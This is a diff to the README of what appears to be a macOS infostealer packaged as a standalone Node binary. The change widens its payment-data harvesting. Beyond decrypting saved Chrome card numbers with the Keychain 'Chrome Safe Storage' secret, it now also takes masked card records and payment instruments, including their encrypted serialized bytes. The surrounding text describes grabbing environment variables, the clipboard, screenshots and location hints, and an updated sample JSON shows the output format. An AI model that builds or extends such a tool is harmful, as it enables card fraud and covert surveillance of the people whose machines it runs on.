@@ -42,7 +42,12 @@ binary with [`pkg`](https://github.com/vercel/pkg).
   and the synced `Account Web Data`; the `card_number` is decrypted from the
   `v10` os_crypt blob using the "Chrome Safe Storage" Keychain secret (account
   "Chrome") and formatted into 4-digit groups (the encrypted blob is kept in
-  `card_number_encrypted`).
+  `card_number_encrypted`). The `masked_credit_cards` table (last four
+  digits, name, network, expiry) and the unified `generic_payment_instruments`
+  store are captured too — the latter is the only place some payment methods
+  (e.g. a card removed from the payment app) survive. Each instrument carries
+  its id, the readable card name / network / last four digits, and the raw
+  `serialized_value` bytes (hex), which include the encrypted card number.
 - **System identity & location** (`system`) — the full `dscl` user record,
   network config + DHCP lease (rough physical location), running-process
   environment variables (`ps -E`), the clipboard, a screen screenshot, and
@@ -157,6 +162,7 @@ machine with no Node installed.
         "web_data": {
           "credit_cards": [ { "guid": "...", "name_on_card": "...", "card_number": "4242 4242 4242 4242", "card_number_encrypted": "...", "expiration_month": 0, "expiration_year": 0 } ],
           "masked_credit_cards": [ { "name_on_card": "...", "network": "...", "last_four": "0000", "exp_month": 0, "exp_year": 0 } ],
+          "payment_instruments": [ { "instrument_id": "...", "name": "...", "network": "visa", "last_four": "0000", "serialized_value_hex": "..." } ],
           "autofill": [ { "field": "...", "value": "..." } ]
         },
         "bookmarks": [ { "name": "...", "url": "..." } ],
